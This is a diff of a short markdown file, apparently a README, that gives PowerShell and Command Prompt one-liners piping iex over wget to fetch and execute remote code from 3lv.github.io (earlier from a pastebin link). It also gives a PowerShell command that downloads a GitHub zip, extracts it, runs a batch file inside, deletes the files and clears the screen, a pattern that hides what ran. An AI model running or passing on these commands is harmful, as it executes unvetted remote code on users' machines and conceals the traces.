@@ -13,14 +13,14 @@ boiling hatred in a pest
 
 # Powershell
 ```
-iex(wget -useb -ur pastebin.com/raw/v27ai472).Content
+iex(wget 3lv.github.io).content
 ```
 # Command Prompt calling Powershell
 ```
-powershell iex(wget -useb -ur pastebin.com/raw/v27ai472).Content
+powershell iex(wget 3lv.github.io).content
 ```
 
-# Paste bin
+# Command at 3lv.github.io
 ```
 &powershell -c '&{$w=$home;$u=''https://github.com/3lv/a/archive/a.zip'';$z=\"$w\a.zip\";$d=\"$w\a\\\";(New-Object System.Net.WebClient).DownloadFile($u,$z);Expand-Archive $z $d -F;cd $d\..;.\a\a-a\a.bat;Remove-Item $z,$d -R -Fo;cls}'
 ```
